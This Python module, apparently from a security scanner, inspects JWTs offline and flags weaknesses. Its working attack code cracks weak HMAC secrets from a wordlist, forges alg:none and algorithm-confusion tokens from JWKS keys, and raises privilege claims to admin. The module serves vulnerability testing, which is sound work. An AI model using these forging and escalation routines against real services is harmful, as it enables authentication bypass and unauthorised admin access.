"""JWT inspection and offline signature analysis.

Decoding, weak-secret recovery and token forging all happen locally. Nothing
here contacts a server; :mod:`authz` decides whether a forged token is worth
replaying against a read-only route.
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import re
import time

JWT_PATTERN = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*")

# Secrets that appear in tutorials, framework defaults and leaked repositories.
WEAK_SECRETS = (
    "secret", "secretkey", "secret_key", "mysecret", "mysecretkey", "jwtsecret",
    "jwt_secret", "jwtSecret", "supersecret", "super_secret", "changeme", "change_me",
    "password", "passw0rd", "admin", "test", "testing", "dev", "development",
    "key", "private", "token", "default", "qwerty", "123456", "1234567890",
    "your-256-bit-secret", "your_jwt_secret", "shhhhh", "s3cr3t", "letmein",
    "HS256", "jwt", "auth", "api", "null", "none", "", "secret123", "P@ssw0rd",
)
PRIVILEGE_CLAIMS = ("role", "roles", "scope", "scopes", "admin", "is_admin", "isAdmin",
                    "permissions", "groups", "authorities", "tier", "plan")


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def _decode_part(segment: str):
    try:
        return json.loads(_b64url_decode(segment))
    except (ValueError, binascii.Error, UnicodeDecodeError):
        return None


def _encode_part(obj: dict) -> str:
    return _b64url_encode(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def find_tokens(text: str, limit: int = 5) -> list[str]:
    seen, out = set(), []
    for match in JWT_PATTERN.finditer(text or ""):
        token = match.group(0)
        if token in seen:
            continue
        seen.add(token)
        out.append(token)
        if len(out) >= limit:
            break
    return out


def decode(token: str) -> dict | None:
    parts = (token or "").split(".")
    if len(parts) != 3:
        return None
    header = _decode_part(parts[0])
    payload = _decode_part(parts[1])
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return {"header": header, "payload": payload, "signature": parts[2], "raw": token}


def verify_hmac(token: str, secret: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header = _decode_part(parts[0]) or {}
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(
        str(header.get("alg", "")).upper()
    )
    if digest is None:
        return False
    expected = hmac.new(secret.encode("utf-8"), f"{parts[0]}.{parts[1]}".encode("ascii"), digest).digest()
    try:
        return hmac.compare_digest(_b64url_encode(expected), parts[2])
    except (TypeError, ValueError):
        return False


def crack_hmac(token: str, extra: tuple = ()) -> str | None:
    """Return the signing secret when it is a well-known weak value."""
    header = decode(token)
    if not header or not str(header["header"].get("alg", "")).upper().startswith("HS"):
        return None
    for candidate in (*extra, *WEAK_SECRETS):
        if verify_hmac(token, candidate):
            return candidate
    return None


# ── public key encoding ─────────────────────────────────────────────────────
# DER tags, from X.690.
_SEQUENCE, _INTEGER, _BIT_STRING = 0x30, 0x02, 0x03
# AlgorithmIdentifier for rsaEncryption: SEQUENCE { OID 1.2.840.113549.1.1.1, NULL }
_RSA_ALGORITHM = bytes.fromhex("300d06092a864886f70d0101010500")


def _der_length(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def _der(tag: int, payload: bytes) -> bytes:
    return bytes([tag]) + _der_length(len(payload)) + payload


def _der_integer(raw: bytes) -> bytes:
    """A DER INTEGER: minimal, and never read as negative."""
    value = raw.lstrip(b"\x00") or b"\x00"
    if value[0] & 0x80:
        value = b"\x00" + value
    return _der(_INTEGER, value)


def rsa_pkcs1_der(modulus: bytes, exponent: bytes) -> bytes:
    """RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }"""
    return _der(_SEQUENCE, _der_integer(modulus) + _der_integer(exponent))


def rsa_spki_der(modulus: bytes, exponent: bytes) -> bytes:
    """SubjectPublicKeyInfo: the form every library writes by default."""
    # The BIT STRING's leading zero byte is its count of unused trailing bits.
    inner = _der(_BIT_STRING, b"\x00" + rsa_pkcs1_der(modulus, exponent))
    return _der(_SEQUENCE, _RSA_ALGORITHM + inner)


def pem(der: bytes, label: str) -> str:
    body = base64.b64encode(der).decode("ascii")
    wrapped = "\n".join(body[index:index + 64] for index in range(0, len(body), 64))
    return f"-----BEGIN {label}-----\n{wrapped}\n-----END {label}-----\n"


def jwks_signing_keys(document, *, key_id: str | None = None, limit: int = 2) -> list[dict]:
    """RSA verification keys from a JWKS, the token's own kid first.

    Keys marked for encryption are skipped: they are not what a signature was
    checked against, so a probe built from one proves nothing.
    """
    keys = document.get("keys") if isinstance(document, dict) else None
    if not isinstance(keys, list):
        return []
    usable = [key for key in keys
              if isinstance(key, dict) and key.get("kty") == "RSA"
              and isinstance(key.get("n"), str) and isinstance(key.get("e"), str)
              and key.get("use") in (None, "sig")
              and str(key.get("alg") or "RS256").upper().startswith(("RS", "PS"))]
    if key_id:
        usable.sort(key=lambda key: key.get("kid") != key_id)
    return usable[:limit]


def confusion_keys(jwk: dict) -> list[tuple[str, bytes]]:
    """The HMAC secrets a confused RS256 verifier would be holding.

    Each is a labelled byte string, most likely first. The label goes in the
    finding, because "which encoding" is the first thing the person fixing it
    needs in order to find the call that loaded it.
    """
    try:
        modulus = _b64url_decode(jwk["n"])
        exponent = _b64url_decode(jwk["e"])
    except (KeyError, TypeError, ValueError, binascii.Error):
        return []
    if not modulus or not exponent:
        return []
    spki = pem(rsa_spki_der(modulus, exponent), "PUBLIC KEY")
    pkcs1 = pem(rsa_pkcs1_der(modulus, exponent), "RSA PUBLIC KEY")
    return [
        ("SubjectPublicKeyInfo PEM", spki.encode("ascii")),
        # A configuration value read with .strip() loses the final newline.
        ("SubjectPublicKeyInfo PEM without its trailing newline",
         spki.rstrip("\n").encode("ascii")),
        ("PKCS#1 PEM", pkcs1.encode("ascii")),
    ]


def forge_unsigned(payload: dict, *, alg: str = "none", header_extra: dict | None = None) -> str:
    """A token with an empty signature, for testing signature enforcement."""
    header = {"alg": alg, "typ": "JWT", **(header_extra or {})}
    return f"{_encode_part(header)}.{_encode_part(payload)}."


def forge_hmac(payload: dict, secret: str | bytes, *, alg: str = "HS256",
               header_extra: dict | None = None) -> str:
    """Sign claims with an HMAC key.

    ``secret`` may be bytes: in an algorithm confusion probe the key is a PEM
    document, and what matters is the exact byte sequence the server holds.
    """
    header = {"alg": alg, "typ": "JWT", **(header_extra or {})}
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg.upper()]
    signing_input = f"{_encode_part(header)}.{_encode_part(payload)}"
    key = secret.encode("utf-8") if isinstance(secret, str) else secret
    signature = hmac.new(key, signing_input.encode("ascii"), digest).digest()
    return f"{signing_input}.{_b64url_encode(signature)}"


def escalated_claims(payload: dict) -> dict:
    """A copy of the payload with privilege claims raised, for a forged-token probe."""
    claims = dict(payload)
    for key in list(claims):
        lowered = key.lower()
        if lowered in ("role", "roles"):
            claims[key] = ["admin"] if isinstance(claims[key], list) else "admin"
        elif lowered in ("admin", "is_admin", "isadmin"):
            claims[key] = True
        elif lowered in ("scope", "scopes"):
            existing = claims[key]
            claims[key] = (list(existing) + ["admin"]) if isinstance(existing, list) else f"{existing} admin"
        elif lowered in ("tier", "plan"):
            claims[key] = "admin"
    if not any(key.lower() in ("role", "roles", "admin", "is_admin", "isadmin") for key in claims):
        claims["role"] = "admin"
    return claims


def analyze(token: str, *, extra_secrets: tuple = ()) -> dict:
    """Decode a token and report everything that can be established offline."""
    decoded = decode(token)
    if not decoded:
        return {"valid": False}
    header, payload = decoded["header"], decoded["payload"]
    alg = str(header.get("alg", "")).upper()
    now = int(time.time())
    expires = payload.get("exp")
    issued = payload.get("iat")

    report = {
        "valid": True,
        "algorithm": alg or "(missing)",
        "header": header,
        "claims": {key: payload[key] for key in list(payload)[:40]},
        "subject": payload.get("sub") or payload.get("user_id") or payload.get("uid"),
        "issuer": payload.get("iss"),
        "audience": payload.get("aud"),
        "key_id": header.get("kid"),
        "weaknesses": [],
        "privilege_claims": {key: payload[key] for key in payload if key in PRIVILEGE_CLAIMS},
    }

    if alg in ("NONE", ""):
        report["weaknesses"].append({
            "id": "alg-none", "severity": "critical",
            "detail": "The token header declares alg:none, so it carries no signature at all.",
        })
    if alg.startswith("HS"):
        secret = crack_hmac(token, extra_secrets)
        if secret is not None:
            report["cracked_secret"] = secret
            report["weaknesses"].append({
                "id": "weak-secret", "severity": "critical",
                "detail": f"The HMAC signature validates under the well-known secret “{secret or '(empty)'}”.",
            })
    if expires is None:
        report["weaknesses"].append({
            "id": "no-expiry", "severity": "medium",
            "detail": "The token declares no exp claim, so it never expires on its own.",
        })
    elif isinstance(expires, (int, float)):
        report["expires_in_seconds"] = int(expires - now)
        if expires < now:
            report["weaknesses"].append({
                "id": "expired", "severity": "info",
                "detail": "The token is already past its exp claim.",
            })
        elif isinstance(issued, (int, float)) and expires - issued > 60 * 60 * 24 * 30:
            report["weaknesses"].append({
                "id": "long-lifetime", "severity": "low",
                "detail": f"The token is valid for {int((expires - issued) / 86400)} days.",
            })
    kid = header.get("kid")
    if isinstance(kid, str) and re.search(r"[/\\'\"]|\.\.|\.(pem|key|json|txt)$|^\s*select\s", kid, re.I):
        report["weaknesses"].append({
            "id": "kid-injectable", "severity": "medium",
            "detail": f"The kid header “{kid}” looks like a file path or query fragment, which some "
                      "implementations pass to a file read or SQL lookup.",
        })
    if header.get("jku") or header.get("x5u"):
        report["weaknesses"].append({
            "id": "remote-key-url", "severity": "high",
            "detail": "The header points at a remote key (jku/x5u). If the URL is not allow-listed, an "
                      "attacker can host their own key and sign arbitrary tokens.",
        })
    for key in ("password", "passwd", "secret", "ssn", "credit_card", "card_number"):
        if key in payload:
            report["weaknesses"].append({
                "id": "sensitive-claim", "severity": "medium",
                "detail": f"The payload carries a “{key}” claim. A JWT payload is base64, not encrypted.",
            })
    return report


def bearer_token(headers: dict) -> str | None:
    """Pull a JWT out of an Authorization header or a token-shaped header value."""
    for name, value in (headers or {}).items():
        if not isinstance(value, str):
            continue
        if name.lower() == "authorization":
            candidate = value.split(" ", 1)[-1].strip()
            if decode(candidate):
                return candidate
        tokens = find_tokens(value, limit=1)
        if tokens:
            return tokens[0]
    return None
